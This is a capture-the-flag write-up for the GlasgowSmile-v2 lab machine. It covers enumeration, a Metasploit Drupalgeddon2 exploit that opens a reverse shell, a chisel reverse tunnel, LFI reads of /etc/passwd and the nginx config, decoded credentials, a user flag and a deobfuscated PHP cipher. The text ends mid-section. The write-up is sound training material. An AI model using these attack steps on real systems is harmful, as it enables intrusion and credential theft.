# GlasgowSmile-v2 Writeup
Let's start with a network scan
```bash
 Currently scanning: 192.168.0.105/24   |   Screen View: Unique Hosts                                                                                                                                         
                                                                                                                                                                                                              
 2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 120                                                                                                                                              
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.0.103   40:65:d4:5e:e0:3e      1      60  Unknown vendor                                                                                                                                             
 192.168.0.129   00:0c:29:a2:5a:01      1      60  VMware, Inc.
```
\
Next, Open Ports
```bash
PORT   STATE SERVICE    REASON
22/tcp   open     ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp   open     http       Apache httpd 2.4.38 ((Debian))
83/tcp   open     http       Apache httpd 2.4.38 ((Debian))
```
\
I opened both port 80 and 83 , and they were the same page
\
<img width="1443" height="753" alt="image" src="https://github.com/user-attachments/assets/109d7bb0-583b-4007-ac15-b5e618732892" />
\
Then i do some enumeration on both port 80 and 83 , both gave same results
```bash
dirsearch -u http://192.168.0.129:83/
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                                                                                   
 (_||| _) (/_(_|| (_| )                                                                                                                                                                                            
                                                                                                                                                                                                                   
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/reports/http_192.168.0.129_83/__26-02-02_10-27-18.txt

Target: http://192.168.0.129:83/

[10:27:18] Starting:                                                                                                                                                                                               
[10:27:19] 403 -  278B  - /.ht_wsr.txt                                      
[10:27:19] 403 -  278B  - /.htaccess.bak1                                   
[10:27:19] 403 -  278B  - /.htaccess.sample                                 
[10:27:19] 403 -  278B  - /.htaccess.save
[10:27:19] 403 -  278B  - /.htaccess.orig
[10:27:19] 403 -  278B  - /.htaccess_extra                                  
[10:27:19] 403 -  278B  - /.htaccess_sc
[10:27:19] 403 -  278B  - /.htaccessOLD
[10:27:19] 403 -  278B  - /.htaccessBAK
[10:27:19] 403 -  278B  - /.htaccess_orig
[10:27:19] 403 -  278B  - /.htaccessOLD2                                    
[10:27:19] 403 -  278B  - /.htm                                             
[10:27:19] 403 -  278B  - /.html
[10:27:19] 403 -  278B  - /.htpasswd_test                                   
[10:27:19] 403 -  278B  - /.htpasswds
[10:27:19] 403 -  278B  - /.httr-oauth
[10:27:19] 403 -  278B  - /.php                                             
[10:27:35] 301 -  322B  - /javascript  ->  http://192.168.0.129:83/javascript/
[10:27:44] 403 -  278B  - /server-status                                    
[10:27:44] 403 -  278B  - /server-status/
[10:27:48] 200 -  286B  - /todo.txt                                         
                                                                             
Task Completed
```
We found a file todo.txt
\
<img width="1105" height="609" alt="image" src="https://github.com/user-attachments/assets/cced9ea7-fbe8-46ec-a263-97bbcbefd815" />
\
From the text file , we know that , there is a bash file , so we start enumerating with .sh extension 
```bash
gobuster dir -t 100 -u http://192.168.0.129:83/  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x txt,sh -r 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.0.129:83/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              txt,sh
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/javascript           (Status: 403) [Size: 278]
/todo.txt             (Status: 200) [Size: 456]
/joke.sh              (Status: 200) [Size: 1676]
```
\
<img width="1142" height="717" alt="image" src="https://github.com/user-attachments/assets/b33e36e7-7be4-4007-9fcc-d3b1f7df46e6" />
\
From the script , we see that there is another directory "/Glasgow---Smile2/"
\
<img width="1671" height="723" alt="image" src="https://github.com/user-attachments/assets/6a3e15de-2de9-4959-b861-472ffffe451f" />
\
And if we check wappalyzer , it says that this is drupal cms 
\
<img width="504" height="550" alt="image" src="https://github.com/user-attachments/assets/62f0aa6b-ca08-480c-af46-79ec1d60e19e" />
\
Next , we use metasploit to get a reverse shell
```bash
msfconsole
Metasploit tip: Use the edit command to open the currently active module 
in your editor
                                                  
 _                                                    _
/ \    /\         __                         _   __  /_/ __
| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \
| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|
|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_
      |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\


       =[ metasploit v6.4.84-dev                                ]
+ -- --=[ 2,547 exploits - 1,309 auxiliary - 1,683 payloads     ]
+ -- --=[ 432 post - 49 encoders - 13 nops - 9 evasion          ]

Metasploit Documentation: https://docs.metasploit.com/
The Metasploit Framework is a Rapid7 Open Source Project

msf > search drupal 8

Matching Modules
================

   #   Name                                           Disclosure Date  Rank       Check  Description
   -   ----                                           ---------------  ----       -----  -----------
   0   exploit/unix/webapp/drupal_drupalgeddon2       2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection
   1     \_ target: Automatic (PHP In-Memory)         .                .          .      .
   2     \_ target: Automatic (PHP Dropper)           .                .          .      .
   3     \_ target: Automatic (Unix In-Memory)        .                .          .      .
   4     \_ target: Automatic (Linux Dropper)         .                .          .      .
   5     \_ target: Drupal 7.x (PHP In-Memory)        .                .          .      .
   6     \_ target: Drupal 7.x (PHP Dropper)          .                .          .      .
   7     \_ target: Drupal 7.x (Unix In-Memory)       .                .          .      .
   8     \_ target: Drupal 7.x (Linux Dropper)        .                .          .      .
   9     \_ target: Drupal 8.x (PHP In-Memory)        .                .          .      .
   10    \_ target: Drupal 8.x (PHP Dropper)          .                .          .      .
   11    \_ target: Drupal 8.x (Unix In-Memory)       .                .          .      .
   12    \_ target: Drupal 8.x (Linux Dropper)        .                .          .      .
   13    \_ AKA: SA-CORE-2018-002                     .                .          .      .
   14    \_ AKA: Drupalgeddon 2                       .                .          .      .
   15  auxiliary/gather/drupal_openid_xxe             2012-10-17       normal     Yes    Drupal OpenID External Entity Injection
   16  exploit/unix/webapp/drupal_restws_unserialize  2019-02-20       normal     Yes    Drupal RESTful Web Services unserialize() RCE
   17    \_ target: PHP In-Memory                     .                .          .      .
   18    \_ target: Unix In-Memory                    .                .          .      .
   19  auxiliary/scanner/http/drupal_views_user_enum  2010-07-02       normal     Yes    Drupal Views Module Users Enumeration
   20  exploit/unix/webapp/php_xmlrpc_eval            2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution


Interact with a module by name or index. For example info 20, use 20 or use exploit/unix/webapp/php_xmlrpc_eval

msf > use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf exploit(unix/webapp/drupal_drupalgeddon2) > options

Module options (exploit/unix/webapp/drupal_drupalgeddon2):

   Name         Current Setting     Required  Description
   ----         ---------------     --------  -----------
   DUMP_OUTPUT  false               no        Dump payload command output
   PHP_FUNC     passthru            yes       PHP function to execute
   Proxies                          no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, http, socks5h
   RHOSTS       192.168.0.129       yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT        80                  yes       The target port (TCP)
   SSL          false               no        Negotiate SSL/TLS for outgoing connections
   TARGETURI    /Glasgow---Smile2/  yes       Path to Drupal install
   VHOST                            no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.0.105    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic (PHP In-Memory)



View the full module info with the info, or info -d command.

msf exploit(unix/webapp/drupal_drupalgeddon2) > check
[+] 192.168.0.129:80 - The target is vulnerable.
msf exploit(unix/webapp/drupal_drupalgeddon2) > run
[*] Started reverse TCP handler on 192.168.0.105:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Sending stage (40004 bytes) to 192.168.0.129
[*] Meterpreter session 1 opened (192.168.0.105:4444 -> 192.168.0.129:37054) at 2026-02-03 05:50:20 -0500
shell

meterpreter > shell
Process 1856 created.
Channel 0 created.
id   
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
\
Now , after checking a little bit , i found a pcap file , and we remember that a network packet file was mentioned in the bash script
```bash
www-data@glasgowsmile2:/var/www/html$ ls -la
total 88
drwxr-xr-x 3 root     root      4096 Jul 17  2020 .
drwxr-xr-x 5 root     root      4096 Jul  9  2020 ..
drwxrwxrwx 8 www-data www-data  4096 Jun 18  2020 Glasgow---Smile2
-rw-r--r-- 1 bane     bane     59069 Jul 17  2020 glasgow.png
-rw-r--r-- 1 root     root       339 Jul  9  2020 index.html
-rw-r--r-- 1 root     root      1676 Jul 15  2020 joke.sh
-rw-r--r-- 1 bane     bane      1506 Jul 15  2020 smileyface.pcap
-rw-r--r-- 1 root     root       456 Jul  9  2020 todo.txt
```
\
After shifting it to my attacker machine and opening with wireshark
```bash
wget 'http://192.168.0.129:9000/smileyface.pcap'
--2026-02-03 05:57:22--  http://192.168.0.129:9000/smileyface.pcap
Connecting to 192.168.0.129:9000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1506 (1.5K) [application/vnd.tcpdump.pcap]
Saving to: ‘smileyface.pcap’

smileyface.pcap                                     100%[==================================================================================================================>]   1.47K  --.-KB/s    in 0s      

2026-02-03 05:57:22 (144 MB/s) - ‘smileyface.pcap’ saved [1506/1506]

                                                                                                                                                                                                               
C:\home\kali\cysec\vulnhub\Glasgow_Smile\2> wireshark smileyface.pcap
```
\
<img width="1688" height="373" alt="image" src="https://github.com/user-attachments/assets/674943e9-eaf8-4525-9db9-e46eaf38ef14" />
\
We see a limited number of packets , so i follow the TCP stream 
\
<img width="825" height="441" alt="image" src="https://github.com/user-attachments/assets/1314006e-4243-4e79-b887-1a91dab314ff" />
\
Here we can see a line with basic auth header 
```bash
Authorization: Basic YWRtaW46Y1B5R0RnVkpOZk5MMkxLNHB4NW4=
```
\
And from the script once again , we know that this is the command to access files
```bash
curl -u user:password http://localhost/Glasgow---Smile2/
```
\
So decoding the auth header , WE get admin credentials
```bash
echo "YWRtaW46Y1B5R0RnVkpOZk5MMkxLNHB4NW4=" | base64 -d
admin:cPyGDgVJNfNL2LK4px5n
```
\
When i check users on the machine
```bash
cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/bin/lshell
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
bane:x:1000:1000:bane,,,:/home/bane:/bin/bash
carnage:x:1001:1001:carnage,,,:/home/carnage:/bin/bash
venom:x:1002:1002:venom,,,:/home/venom:/bin/bash
riddler:x:1003:1003:Riddler,,,:/home/riddler:/bin/bash
```
\
So after a lot of enumeration , i checked the current listening ports on the machine using
```bash
netstat -tuln
```
```bash
etstat -tuln
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN     
tcp6       0      0 :::80                   :::*                    LISTEN     
tcp6       0      0 :::83                   :::*                    LISTEN     
udp        0      0 0.0.0.0:68              0.0.0.0:*
```
\
Here we can see that Port 8080 and 3306 are open , but only accessible locally 
\
So , i try to curl to port 8080
```bash
url 127.0.0.1:8080
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body {font-family: Arial, Helvetica, sans-serif;}

/* Full-width input fields */
input[type=text], input[type=password] {
  width: 100%;
  padding: 12px 20px;
  margin: 8px 0;
  display: inline-block;
  border: 1px solid #ccc;
  box-sizing: border-box;
}

/* Set a style for all buttons */
button {
  background-color: #000000;
  color: white;
  padding: 14px 20px;
  margin: 8px 0;
  border: none;
  cursor: pointer;
  width: 100%;
}

button:hover {
  opacity: 0.8;
}

/* Extra styles for the cancel button */

.....Extra stuff
```
\
And i see that it is a html document , so i setup port forwarding with chisel
\
Steps to setup portforwarding
\
1) ON attacker machine
```bash
   ./chisel_1.11.3_linux_amd64 server -p 9001 --reverse
```
\
On target machine
```bash
wget 'https://github.com/jpillora/chisel/releases/download/v1.11.3/chisel_1.11.3_linux_amd64.gz'
gzip -d chisel_1.11.3_linux_amd64.gz
chmod +x chisel_1.11.3_linux_amd64.gz
./chisel_1.11.3_linux_amd64 client 192.168.0.105:9001 R:8983:127.0.0.1:8080
```
Here "./chisel_1.11.3_linux_amd64 client 192.168.0.105:9001 R:8983:127.0.0.1:8080" , we are forwarding port of 8080 of the machine ip "127.0.0.1" to port of 8983 of remote op "192.168.0.105"
\
Opening port 8983 in browser , shows
\
<img width="404" height="222" alt="image" src="https://github.com/user-attachments/assets/c6bc6ab9-f979-4560-9f42-622ec87f39c9" />
\
And if we check the source of this page , we see 2 interesting things 
\
First a comment that says this website is hosted with nginx and another , a page parameter taking the value of file location
\
<img width="1261" height="700" alt="image" src="https://github.com/user-attachments/assets/023304f3-3330-43f1-ad12-6fe3532981b1" />
\
I tried to access /etc/passwd using LFI vuln and successfully got it
\
<img width="1682" height="390" alt="image" src="https://github.com/user-attachments/assets/7b0e0de7-b159-4ad2-b5a3-7e5f3b2b3fa3" />
\
And since the comment was talking about nginx , we can try to get config file of nginx at "/etc/nginx/sites-enabled/default.conf"
\
<img width="1259" height="755" alt="image" src="https://github.com/user-attachments/assets/3e3b866d-5180-4dbf-bca8-0e683b531505" />
\
We can see something important here , we see a location path "/helpmeriddlernewapplication" and the file that is being served "/var/www/myplace/hereis/threatened/index.php"
\
When we access that location on browser , it says not found
\
<img width="1097" height="352" alt="image" src="https://github.com/user-attachments/assets/6f5e6608-df26-46b8-b046-a0cb4afac1c4" />
\
But , since we have an LFI vuln , we can try to directly access /var/www/myplace/hereis/threatened/index.php
\
When we access that file , we see a riddle
\
<img width="1303" height="743" alt="image" src="https://github.com/user-attachments/assets/68e6110b-0423-43de-9f6b-cd915fffcb6a" />
\
When i searched the riddle online , this site "https://www.riddles.com/6465" had the answer , and after entering the exact answer 
\
We get a popup with the password of the user riddler
\
<img width="437" height="123" alt="image" src="https://github.com/user-attachments/assets/87092f58-7876-4d79-a534-6f2170b0f751" />
\
then , we can ssh as riddler
```bash
ssh riddler@192.168.0.129                                    
The authenticity of host '192.168.0.129 (192.168.0.129)' can't be established.
ED25519 key fingerprint is SHA256:8wWNHKD7HjlHI3xkzCDtp8/UUgMsdB8tjPNBVTkCtGU.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.0.129' (ED25519) to the list of known hosts.
riddler@192.168.0.129's password: 
Linux glasgowsmile2 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
riddler@glasgowsmile2:~$ id
uid=1003(riddler) gid=1003(riddler) groups=1003(riddler)
riddler@glasgowsmile2:~$ cat user.txt 
GS2{52ed6cddca27b44be716f9b856744008}
riddler@glasgowsmile2:~/theworldmustbeburned$ ls -la
total 24
drwxr-xr-x 2 riddler riddler 4096 Jul  9  2020 .
drwxr-xr-x 4 riddler riddler 4096 Jul  9  2020 ..
-rwxrwx--- 1 riddler riddler  845 Jun 30  2020 burn
-rw-r----- 1 riddler riddler 1093 Jun 30  2020 info.txt
-rw-r----- 1 riddler riddler  380 Jun 30  2020 jokerinthepack
-rw-r----- 1 riddler riddler 1083 Jun 30  2020 message.txt
riddler@glasgowsmile2:~/theworldmustbeburned$ cat info.txt 
  __     __   __     _____    _____       _____       _____     _____    _____      _____     _____    __  __   
 /\_\   /\_\ /_/\   /\___/\  /\ __/\     /\___/\    /\  __/\   /\___/\  /\ __/\    /\ __/\   /\___/\ /\  /\  /\ 
 \/_/  ( ( (_) ) ) / / _ \ \ ) )  \ \   / / _ \ \   ) )(_ ) ) / / _ \ \ ) )  \ \   ) )  \ \ / / _ \ \\ \ \/ / / 
  /\_\  \ \___/ /  \ \(_)/ // / /\ \ \  \ \(_)/ /  / / __/ /  \ \(_)/ // / /\ \ \ / / /\ \ \\ \(_)/ / \ \__/ /  
 / / /  / / _ \ \  / / _ \ \\ \ \/ / /  / / _ \ \  \ \  _\ \  / / _ \ \\ \ \/ / / \ \ \/ / // / _ \ \  \__/ /   
( (_(  ( (_( )_) )( (_( )_) )) )__/ /  ( (_( )_) )  ) )(__) )( (_( )_) )) )__/ /   ) )__/ /( (_( )_) ) / / /    
 \/_/   \/_/ \_\/  \/_/ \_\/ \/___\/    \/_/ \_\/   \/____\/  \/_/ \_\/ \/___\/    \/___\/  \/_/ \_\/  \/_/     
                                                                                                                

Hey,
listen to this song, maybe it could help you to try to understand my encryption code.
Don't worry about it, it's impossible to break ;)

https://www.youtube.com/watch?v=WV5-KhZMOtY


riddler@glasgowsmile2:~/theworldmustbeburned$ cat message.txt 
Your keys:
Key 1: I make them laught a lot
Key 2: Because jokers are wild
Encrypted string:2188F2236A2200F2236A2269F2301A2263F2291A2186F2299A2255F2300A2186F2287A2268F2291A2264F2229A2270F2222A2262F2301A2265F2297A2259F2300A2257F2222A2256F2301A2268F2222A2251F2300A2275F2306A2258F2295A2264F2293A2186F2298A2265F2293A2259F2289A2251F2298A2198F2222A2262F2295A2261F2291A2186F2299A2265F2300A2255F2311A2200F2222A2238F2294A2255F2311A2186F2289A2251F2300A2193F2306A2186F2288A2255F2222A2252F2301A2271F2293A2258F2306A2198F2222A2252F2307A2262F2298A2259F2291A2254F2234A2186F2304A2255F2287A2269F2301A2264F2291A2254F2234A2186F2301A2268F2222A2264F2291A2257F2301A2270F2295A2251F2306A2255F2290A2186F2309A2259F2306A2258F2236A2186F2273A2265F2299A2255F2222A2263F2291A2264F2222A2260F2307A2269F2306A2186F2309A2251F2300A2270F2222A2270F2301A2186F2309A2251F2306A2253F2294A2186F2306A2258F2291A2186F2309A2265F2304A2262F2290A2186F2288A2271F2304A2264F2236A2188F2222A2239F2260A2240F2259A2205F2244A2225F2308A2239F2299A2229F2242A2238F2289A2244F2257A2274F2256A2258F2246A2272F2275A2223F2277A2271F2279A2255F2297A2221F2279A

riddler@glasgowsmile2:~/theworldmustbeburned$ cat jokerinthepack 
Oh my boots they shine
And my bowler looks fine
Take some time and care
Take a look at my hair
We hit the dance hall
So smart and so chic
I make them laught a lot
I make them accept me
Secrets are spoken
Plans are drawn in the dust
With a gay bravado
I'm taken into their trust
Oh my boots they shine
And my bowler looks fine
But don't confide in my smile
Because jokers are wild
```
\
There is also a file burn, which has executable permissions, so i try to run , but it throws an error
```bash
riddler@glasgowsmile2:~/theworldmustbeburned$ ./burn 
./burn: line 1: syntax error near unexpected token `('
./burn: line 1: `<?php function grdl($q0){$b1=fopen($q0,'r')or die();$a2=0;while(!feof($b1)){$t3=fgets($b1);$a2++;}rewind($b1);$s4=0;$n5=rand(0,$a2);while((!feof($b1))&&($s4<=$n5)){if($x6=fgets($b1,1048576)){$s4++;}}fclose($b1)or die();return $x6;}function gws($n7){$j8=str_split($n7);$a9=0;foreach($j8 as $m10){$a9+=ord($m10);}return $a9;}function encrypt($c11,$j12,$e13){$f14=true;$l15=gws($c11);$q16=gws($j12);$f17=str_split($e13);$a18="";foreach($f17 as $m10){$f14=!$f14;$p19=$l15;if($f14){$p19=$q16;}$a18.=ord($m10)+$p19;if($f14){$a18.="A";}else{$a18.="F";}}return $a18;}$q0="jokerinthepack";$e13=readline("Enter the string to encrypt: ");$c11=trim(grdl($q0));$j12=trim(grdl($q0));print"\n";print"Your keys:";print"\n";print"Key 1: ".$c11;print"\n";print"Key 2: ".$j12;print"\n";$a18=trim(encrypt($c11,$j12,$e13));print"Encrypted string:".$a18."\n\n\n";?>'
```
```
riddler@glasgowsmile2:~/theworldmustbeburned$ strings burn 
<?php function grdl($q0){$b1=fopen($q0,'r')or die();$a2=0;while(!feof($b1)){$t3=fgets($b1);$a2++;}rewind($b1);$s4=0;$n5=rand(0,$a2);while((!feof($b1))&&($s4<=$n5)){if($x6=fgets($b1,1048576)){$s4++;}}fclose($b1)or die();return $x6;}function gws($n7){$j8=str_split($n7);$a9=0;foreach($j8 as $m10){$a9+=ord($m10);}return $a9;}function encrypt($c11,$j12,$e13){$f14=true;$l15=gws($c11);$q16=gws($j12);$f17=str_split($e13);$a18="";foreach($f17 as $m10){$f14=!$f14;$p19=$l15;if($f14){$p19=$q16;}$a18.=ord($m10)+$p19;if($f14){$a18.="A";}else{$a18.="F";}}return $a18;}$q0="jokerinthepack";$e13=readline("Enter the string to encrypt: ");$c11=trim(grdl($q0));$j12=trim(grdl($q0));print"\n";print"Your keys:";print"\n";print"Key 1: ".$c11;print"\n";print"Key 2: ".$j12;print"\n";$a18=trim(encrypt($c11,$j12,$e13));print"Encrypted string:".$a18."\n\n\n";?>
```
\
After seeing the content , i realise its a php file and create a new file source.php after formatiing it
```
<?php

function grdl($q0) {
    $b1 = fopen($q0, 'r') or die();
    $a2 = 0;

    // Count lines
    while (!feof($b1)) {
        $t3 = fgets($b1);
        $a2++;
    }

    rewind($b1);

    // Pick random line
    $s4 = 0;
    $n5 = rand(0, $a2);

    while ((!feof($b1)) && ($s4 <= $n5)) {
        if ($x6 = fgets($b1, 1048576)) {
            $s4++;
        }
    }

    fclose($b1) or die();
    return $x6;
}

function gws($n7) {
    $j8 = str_split($n7);
    $a9 = 0;

    foreach ($j8 as $m10) {
        $a9 += ord($m10);
    }

    return $a9;
}

function encrypt($c11, $j12, $e13) {
    $f14 = true;
    $l15 = gws($c11);
    $q16 = gws($j12);

    $f17 = str_split($e13);
    $a18 = "";

    foreach ($f17 as $m10) {
        $f14 = !$f14;

        $p19 = $l15;
        if ($f14) {
            $p19 = $q16;
        }

        $a18 .= ord($m10) + $p19;

        if ($f14) {
            $a18 .= "A";
        } else {
            $a18 .= "F";
        }
    }

    return $a18;
}

$q0 = "jokerinthepack";

$e13 = readline("Enter the string to encrypt: ");

$c11 = trim(grdl($q0));
$j12 = trim(grdl($q0));

print "\n";
print "Your keys:\n";
print "Key 1: " . $c11 . "\n";
print "Key 2: " . $j12 . "\n";

$a18 = trim(encrypt($c11, $j12, $e13));

print "Encrypted string:" . $a18 . "\n\n\n";

?>
```
\










After some time , i didnt know how to escalate privileges , so i ran pspy and i found a unique process being run by user wit uid 1002
\
<img width="758" height="22" alt="image" src="https://github.com/user-attachments/assets/89724dfa-eeab-4585-9f3a-b6ed5e12cde8" />
\
```bash
